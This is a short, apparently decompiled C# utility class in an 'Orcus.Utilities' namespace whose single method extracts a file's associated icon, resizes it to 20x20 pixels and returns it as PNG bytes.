using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using Orcus.Extensions;

namespace Orcus.Utilities;

public static class FileUtilities
{
	public static byte[] GetIconFromProcess(string filename)
	{
		Icon val = Icon.ExtractAssociatedIcon(filename);
		if (val == null)
		{
			return null;
		}
		Icon val2 = val;
		try
		{
			Bitmap val3 = ((Image)(object)val.ToBitmap()).ResizeImage(20, 20);
			try
			{
				using MemoryStream memoryStream = new MemoryStream();
				((Image)val3).Save((Stream)memoryStream, ImageFormat.get_Png());
				return memoryStream.ToArray();
			}
			finally
			{
				((IDisposable)val3)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
	}
}
